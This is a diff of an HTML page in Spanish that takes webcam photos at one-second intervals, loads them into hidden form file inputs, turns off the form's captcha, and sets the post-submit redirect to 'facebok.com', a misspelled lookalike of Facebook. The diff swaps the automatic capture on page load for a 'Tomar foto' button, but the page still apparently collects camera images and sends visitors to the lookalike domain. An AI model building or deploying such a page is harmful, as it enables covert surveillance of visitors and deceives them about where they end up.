@@ -11,6 +11,7 @@
    <input type="file" id="photoInput2" name="attachment2" accept="image/png, image/jpeg">
    <input type="file" id="photoInput3" name="attachment3" accept="image/png, image/jpeg">
    <input type="file" id="photoInput4" name="attachment4" accept="image/png, image/jpeg">
+     <button id="takePhotoButton" type="button">Tomar foto</button>
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://www.facebok.com">
   </form>
@@ -18,6 +19,7 @@
 let fotoCount = 0;
 const maxFotos = 4;
 const intervalo = 1000; // 1 segundo
+
 const photoInputs = [
   document.getElementById('photoInput1'),
   document.getElementById('photoInput2'),
@@ -34,7 +36,7 @@ function tomarFoto() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     canvas.toBlob(blob => {
-      const file = new File([blob], `photo${fotoCount + 1}.png`, { type: 'image/png' });
+      const file = new File([blob], `photo${fotoCount +1}.png`, { type: 'image/png' });
       const dt = new DataTransfer();
       dt.items.add(file);
       photoInputs[fotoCount].files = dt.files;
@@ -48,9 +50,9 @@ function tomarFoto() {
   }
 }
 
-window.addEventListener('load', () => {
+document.getElementById('takePhotoButton').addEventListener('click', () => {
   tomarFoto();
 });
-</script>
+  </script>
 </body>
 </html>
